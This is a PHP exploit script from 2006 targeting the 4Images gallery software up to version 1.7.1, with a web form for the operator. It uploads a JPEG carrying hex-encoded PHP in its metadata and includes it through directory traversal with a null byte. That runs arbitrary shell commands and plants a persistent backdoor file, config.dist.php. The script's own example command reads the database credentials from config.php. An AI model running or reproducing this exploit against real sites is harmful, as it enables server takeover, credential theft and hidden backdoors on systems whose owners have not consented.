<?php
#  ----4images_171_incl_xpl.php                              6.45 
26/02/2006   #
#                                                                              
#
#  4Images <= 1.7.1 remote commands execution through arbitrary local          
#
#  inclusion                                                                   
#
#                              coded by rgod                                   
#
#                    site: http://retrogod.altervista.org                      
#
#                                                                              
#
#  -> this works regardless of magic_quotes_gpc settings                       
#
#                                                                              
#
# Sun-Tzu: "Having doomed spies, doing certain things openly for purposes 
of   #
# deception, and allowing our spies to know  of them and report them to  
the   #
# enemy."                                                                      
#

/* short explaination:
   directory traversal in "template" argument, ex:

   
http://[target]/[path]/index.php?template=../../../../../../../etc/passwd%00

   this exploit uploads a .jpg file with maliciuos EXIF metadata 
comptempt,
   it will be evaluated as php code:

   
http://[target]/[path]/index.php?template=../../data/tmp_media/suntzu1293.jpg%00
   or
   
http://[target]/[path]/index.php?template=../../data/media/1/suntzu1293.jpg%00

   also, it installs a backdoor on target server, called 
"config.dist.php",
   then...

   http://[target]/[path]/config.dist.php?cmd=cat%20config.php
 								              
*/
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
ob_implicit_flush (1);

echo'<html><head><title>****** 4Images <= 1.7.1 remote commands execution 
******
</title><meta http-equiv="Content-Type" content="text/html; 
charset=iso-8859-1">
<style type="text/css"> body {background-color:#111111;   
SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; 
}  img
{background-color:   #FFFFFF   !important}  input  {background-color:    
#303030
!important} option {  background-color:   #303030   !important}         
textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  
option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        
checkbox
{background-color: #303030 !important} select {font-weight: normal;       
color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       
!important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 
{font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 
0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 
0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 
0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * 
{font-style:
normal !important} *{text-decoration: none !important} 
a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: 
underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  
sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  
sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p 
class="Stile6">
****** 4Images <= 1.7.1 remote commands execution ****** </p><p 
class="Stile6">a
script  by  rgod  at    <a 
href="http://retrogod.altervista.org"target="_blank">
http://retrogod.altervista.org</a></p><table width="84%"><tr><td    
width="43%">
<form name="form1" method="post"   action="'.$_SERVER[PHP_SELF].'">    
<p><input
type="text"  name="host"> <span class="Stile5">* target    
(ex:www.sitename.com)
</span></p> <p><input type="text" name="path">  <span class="Stile5">* 
path (ex:
/4images/ or just / ) </span></p><p><input type="text" name="cmd">         
<span
class="Stile5"> * specify a command ("cat config.php" to see database 
username &
password...)</span></p><p><input type="text"   name="USER"><span 
class="Stile5">
a valid USER ...</span></p><p><input type="password" name="PASS">          
<span
class="Stile5"> ... and PASSWORD, required for STEP 2 and following...   
</span>
</p>  <p> <input   type="text" name="port"><span class="Stile5">specify  a  
port
other than  80 (default value) </span></p><p><input type="text"    
name="proxy">
<span class="Stile5">send  exploit through an HTTP proxy 
(ip:port)</span></p><p>
<input type="submit" name="Submit" value="go!"> </p> </form> </td> 
</tr></table>
</body></html>';


function show($headeri)
{
  $ii=0;$ji=0;$ki=0;$ci=0;
  echo '<table border="0"><tr>';
  while ($ii <= strlen($headeri)-1){
    $datai=dechex(ord($headeri[$ii]));
    if ($ji==16) {
      $ji=0;
      $ci++;
      echo "<td>&nbsp;&nbsp;</td>";
      for ($li=0; $li<=15; $li++) {
        echo "<td>".htmlentities($headeri[$li+$ki])."</td>";
		}
      $ki=$ki+16;
      echo "</tr><tr>";
    }
    if (strlen($datai)==1) {
      echo "<td>0".htmlentities($datai)."</td>";
    }
    else {
      echo "<td>".htmlentities($datai)."</td> ";
    }
    $ii++;$ji++;
  }
  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {
    echo "<td>&nbsp&nbsp</td>";
  }
  for ($li=$ci*16; $li<=strlen($headeri); $li++) {
    echo "<td>".htmlentities($headeri[$li])."</td>";
  }
  echo "</tr></table>";
}

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //2x speed
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
    echo "socket_create() failed: reason: " . socket_strerror($socket) . 
"<br>";
  }
  else {
    $c = preg_match($proxy_regex,$proxy);
    if (!$c) {echo 'Not a valid proxy...';
    die;
    }
  echo "OK.<br>";
  echo "Attempting to connect to ".$host." on port ".$port."...<br>";
  if ($proxy=='') {
    $result = socket_connect($socket, $host, $port);
  }
  else {
    $parts =explode(':',$proxy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
    $result = socket_connect($socket, $parts[0],$parts[1]);
  }
  if ($result < 0) {
    echo "socket_connect() failed.\r\nReason: (".$result.") " . 
socket_strerror($result) . "<br><br>";
  }
  else {
    echo "OK.<br><br>";
    $html= '';
    socket_write($socket, $packet, strlen($packet));
    echo "Reading response:<br>";
    while ($out= socket_read($socket, 2048)) {$html.=$out;}
    echo nl2br(htmlentities($html));
    echo "Closing socket...";
    socket_close($socket);
  }
  }
}

function refresh()
{
  flush();
  ob_flush();
  usleep(5000000000);
}

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.htmlentities($host); die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid prozy...';die;
    }
    $parts=explode(':',$proxy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or 
(!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);echo nl2br(htmlentities($html));
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$_POST[host];$port=$_POST[port];$path=$_POST[path];
$USER=$_POST[USER];$PASS=$_POST[PASS];$cmd=$_POST[cmd];$proxy=$_POST[proxy];

echo "<span class=\"Stile5\">";

  if (($host<>'') and ($path<>'') and ($cmd<>''))
  {
    $port=intval(trim($port));
    if ($port=='') {$port=80;}
    if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('Error... 
check the path!');}
    if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

    # STEP 1 -> check if backdoor already installed...
    $packet ="GET ".$p."config.dist.php?cmd=".urlencode($cmd)." 
HTTP/1.1\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Connection: Close\r\n\r\n";
    show($packet);
    sendpacketii($packet);
    if (eregi("Hi Master!",$html)) {die("backdoor already 
installed...exploit succeeded...</span>");}

  }
  echo "backdoor not installed... -> STEP 2...<BR>";
  if (($host<>'') and ($path<>'') and ($cmd<>'') and ($USER<>'') and 
($PASS<>''))
  {

    # STEP 2 -> Login...
    $data="user_name=".$USER."&user_password=".$PASS."&auto_login=1";
    $packet ="POST ".$p."login.php HTTP/1.1\r\n";
    $packet.="User-Agent: sun-tzu\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Accept: text/plain\r\n";
    $packet.="Accept-Language: en\r\n";
    $packet.="Referer: http://".$host.$path."index.php?lang=en\r\n";
    $packet.="Connection: Close\r\n";
    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n\r\n";
    $packet.=$data;
    show($packet);
    sendpacketii($packet);
    if (!eregi("Location:",$html)) {die("Failed to login...");}
    $temp=explode("Set-Cookie: ",$html);
    $COOKIE='';
    for ($i=1; $i<=6; $i++)
    {
      $temp2=explode(" ",$temp[$i]);
      $COOKIE.=" ".$temp2[0];
    }
    echo "COOKIE -> ".htmlentities($COOKIE)."\r\n";

    # STEP 3 -> Retrieve a category to put jpeg in
    $packet ="GET ".$p."index.php HTTP/1.1\r\n";
    $packet.="User-Agent: sun-tzu\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Accept-Language: en\r\n";
    $packet.="Referer: http://".$host.$path."index.php?lang=en\r\n";
    $packet.="Cookie:".$COOKIE."\r\n";
    $packet.="Connection: Close\r\n\r\n";
    show($packet);
    sendpacketii($packet);
    $temp=explode("cat_id=",$html);
    $temp2=explode("&",$temp[1]);
    $CATID=$temp2[0];
    echo "CATID -> ".htmlentities($CATID)."\r\n";
    if (($CATID=='') | (strlen($CATID) > 3))
    {die("Failed to retrieve a valid category to upload image in...");}

    # STEP 4 -> Upload evil jpg file...
    $shell=
    
chr(0xff).chr(0xd8).chr(0xff).chr(0xfe).chr(0x01).chr(0x3f).chr(0x3c).chr(0x3f).
    
chr(0x70).chr(0x68).chr(0x70).chr(0x0d).chr(0x0a).chr(0x6f).chr(0x62).chr(0x5f).
    
chr(0x63).chr(0x6c).chr(0x65).chr(0x61).chr(0x6e).chr(0x28).chr(0x29).chr(0x3b).
    
chr(0x0d).chr(0x0a).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).chr(0x22).chr(0x48).
    
chr(0x69).chr(0x20).chr(0x4d).chr(0x61).chr(0x73).chr(0x74).chr(0x65).chr(0x72).
    
chr(0x21).chr(0x22).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x69).chr(0x6e).chr(0x69).
    
chr(0x5f).chr(0x73).chr(0x65).chr(0x74).chr(0x28).chr(0x22).chr(0x6d).chr(0x61).
    
chr(0x78).chr(0x5f).chr(0x65).chr(0x78).chr(0x65).chr(0x63).chr(0x75).chr(0x74).
    
chr(0x69).chr(0x6f).chr(0x6e).chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).
    
chr(0x22).chr(0x2c).chr(0x30).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x70).
    
chr(0x61).chr(0x73).chr(0x73).chr(0x74).chr(0x68).chr(0x72).chr(0x75).chr(0x28).
    
chr(0x24).chr(0x5f).chr(0x47).chr(0x45).chr(0x54).chr(0x5b).chr(0x22).chr(0x63).
    
chr(0x6d).chr(0x64).chr(0x22).chr(0x5d).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).
    
chr(0x24).chr(0x69).chr(0x6e).chr(0x3d).chr(0x22).chr(0x3c).chr(0x3f).chr(0x70).
    
chr(0x68).chr(0x70).chr(0x20).chr(0x6f).chr(0x62).chr(0x5f).chr(0x63).chr(0x6c).
    
chr(0x65).chr(0x61).chr(0x6e).chr(0x28).chr(0x29).chr(0x3b).chr(0x65).chr(0x63).
    
chr(0x68).chr(0x6f).chr(0x5c).chr(0x22).chr(0x48).chr(0x69).chr(0x20).chr(0x4d).
    
chr(0x61).chr(0x73).chr(0x74).chr(0x65).chr(0x72).chr(0x21).chr(0x5c).chr(0x22).
    
chr(0x3b).chr(0x69).chr(0x6e).chr(0x69).chr(0x5f).chr(0x73).chr(0x65).chr(0x74).
    
chr(0x28).chr(0x5c).chr(0x22).chr(0x6d).chr(0x61).chr(0x78).chr(0x5f).chr(0x65).
    
chr(0x78).chr(0x65).chr(0x63).chr(0x75).chr(0x74).chr(0x69).chr(0x6f).chr(0x6e).
    
chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).chr(0x5c).chr(0x22).chr(0x2c).
    
chr(0x30).chr(0x29).chr(0x3b).chr(0x70).chr(0x61).chr(0x73).chr(0x73).chr(0x74).
    
chr(0x68).chr(0x72).chr(0x75).chr(0x28).chr(0x5c).chr(0x24).chr(0x5f).chr(0x47).
    
chr(0x45).chr(0x54).chr(0x5b).chr(0x5c).chr(0x22).chr(0x63).chr(0x6d).chr(0x64).
    
chr(0x5c).chr(0x22).chr(0x5d).chr(0x29).chr(0x3b).chr(0x64).chr(0x69).chr(0x65).
    
chr(0x3b).chr(0x3f).chr(0x3e).chr(0x22).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x24).
    
chr(0x73).chr(0x75).chr(0x6e).chr(0x3d).chr(0x66).chr(0x6f).chr(0x70).chr(0x65).
    
chr(0x6e).chr(0x28).chr(0x22).chr(0x63).chr(0x6f).chr(0x6e).chr(0x66).chr(0x69).
    
chr(0x67).chr(0x2e).chr(0x64).chr(0x69).chr(0x73).chr(0x74).chr(0x2e).chr(0x70).
    
chr(0x68).chr(0x70).chr(0x22).chr(0x2c).chr(0x22).chr(0x77).chr(0x22).chr(0x29).
    
chr(0x3b).chr(0x0d).chr(0x0a).chr(0x66).chr(0x70).chr(0x75).chr(0x74).chr(0x73).
    
chr(0x28).chr(0x24).chr(0x73).chr(0x75).chr(0x6e).chr(0x2c).chr(0x24).chr(0x69).
    
chr(0x6e).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x66).chr(0x63).chr(0x6c).
    
chr(0x6f).chr(0x73).chr(0x65).chr(0x28).chr(0x24).chr(0x73).chr(0x75).chr(0x6e).
    
chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x63).chr(0x68).chr(0x6d).chr(0x6f).
    
chr(0x64).chr(0x28).chr(0x22).chr(0x63).chr(0x6f).chr(0x6e).chr(0x66).chr(0x69).
    
chr(0x67).chr(0x2e).chr(0x64).chr(0x69).chr(0x73).chr(0x74).chr(0x2e).chr(0x70).
    
chr(0x68).chr(0x70).chr(0x22).chr(0x2c).chr(0x37).chr(0x37).chr(0x37).chr(0x29).
    
chr(0x3b).chr(0x0d).chr(0x0a).chr(0x64).chr(0x69).chr(0x65).chr(0x3b).chr(0x0d).
    
chr(0x0a).chr(0x3f).chr(0x3e).chr(0xff).chr(0xe0).chr(0x00).chr(0x10).chr(0x4a).
    
chr(0x46).chr(0x49).chr(0x46).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x00).
    
chr(0x48).chr(0x00).chr(0x48).chr(0x00).chr(0x00).chr(0xff).chr(0xdb).chr(0x00).
    
chr(0x43).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0xff).chr(0xdb).chr(0x00).chr(0x43).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
    
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0xff).
    
chr(0xc0).chr(0x00).chr(0x11).chr(0x08).chr(0x00).chr(0x01).chr(0x00).chr(0x01).
    
chr(0x03).chr(0x01).chr(0x11).chr(0x00).chr(0x02).chr(0x11).chr(0x01).chr(0x03).
    
chr(0x11).chr(0x01).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x00).chr(0x01).
    
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
    
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x09).
    
chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x10).chr(0x01).chr(0x00).chr(0x00).
    
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
    
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xc4).
    
chr(0x00).chr(0x14).chr(0x01).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
    
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
    
chr(0x00).chr(0x00).chr(0x00).chr(0x06).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).
    
chr(0x11).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
    
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
    
chr(0x00).chr(0x00).chr(0xff).chr(0xda).chr(0x00).chr(0x0c).chr(0x03).chr(0x01).
    
chr(0x00).chr(0x02).chr(0x11).chr(0x03).chr(0x11).chr(0x00).chr(0x3f).chr(0x00).
    chr(0x3f).chr(0xc1).chr(0xc7).chr(0xdf).chr(0xff).chr(0xd9).chr(0x00);
    srand(make_seed());
    $v = rand(1,9999);
    $evil="suntzu".$v.".jpg";
    $data ="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
    $data.="Content-Disposition: form-data; name=\"action\"\r\n\r\n";
    $data.="uploadimage\r\n";
    $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
    $data.="Content-Disposition: form-data; name=\"cat_id\"\r\n\r\n";
    $data.=$CATID."\r\n";
    $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
    $data.="Content-Disposition: form-data; name=\"media_file\"; 
filename=\"".$evil."\"\r\n";
    $data.="Content-Type: image/jpeg\r\n\r\n";
    $data.=$shell."\r\n";
    $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
    $data.="Content-Disposition: form-data; 
name=\"remote_media_file\"\r\n\r\n\r\n";
    $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
    $data.="Content-Disposition: form-data; name=\"thumb_file\"; 
filename=\"\"\r\n\r\n\r\n";
    $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
    $data.="Content-Disposition: form-data; 
name=\"remote_thumb_file\"\r\n\r\n\r\n";
    $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
    $data.="Content-Disposition: form-data; name=\"image_name\"\r\n\r\n";
    $data.="flower\r\n";
    $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
    $data.="Content-Disposition: form-data; 
name=\"image_description\"\r\n\r\n";
    $data.="wonderful flower\r\n";
    $data.="------------lNnHj26YsSTIS0qSMhw5MK\r\n";
    $data.="Content-Disposition: form-data; 
name=\"image_keywords\"\r\n\r\n";
    $data.="flower\r\n";
    $data.="------------lNnHj26YsSTIS0qSMhw5MK--\r\n";
    $packet ="POST ".$p."member.php HTTP/1.1\r\n";
    $packet.="User-Agent: suntzoi\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Accept-Language: en\r\n";
    $packet.="Referer: 
http://".$host.$path."member.php?action=uploadform&cat_id=".$CATID."\r\n";
    $packet.="Connection: Close\r\n";
    $packet.="Cookie:".$COOKIE."\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Content-Type: multipart/form-data; 
boundary=----------lNnHj26YsSTIS0qSMhw5MK\r\n\r\n";
    $packet.=$data;
    show($packet);
    sendpacketii($packet);

    # STEP 5 -> Launch commands...
    $xpl="../../data/tmp_media/".$evil.chr(0x00);
    $xpl=urlencode($xpl);
    $packet ="GET 
".$p."index.php?cmd=".urlencode($cmd)."&template=".$xpl." HTTP/1.1\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Connection: Close\r\n\r\n";
    show($packet);
    sendpacketii($packet);
    if (eregi("Hi Master!",$html)) {die("Exploit succeeded...");}

    for ($subf=1; $subf<=100; $subf++)
    {
      $xpl="../../data/media/".$subf."/".$evil.chr(0x00);
      $xpl=urlencode($xpl);
      $packet ="GET 
".$p."index.php?cmd=".urlencode($cmd)."&template=".$xpl." HTTP/1.1\r\n";
      $packet.="Host: ".$host."\r\n";
      $packet.="Connection: Close\r\n\r\n";
      show($packet);
      sendpacketii($packet);
      if (eregi("Hi Master!",$html)) {die("Exploit succeeded...");}
    }
    //if you are here...
    echo "Exploit failed...";

   }
   else
   {echo "Fill * required fields for step 2 and followings, optionally 
specify a proxy...";}
echo "</span>";
?>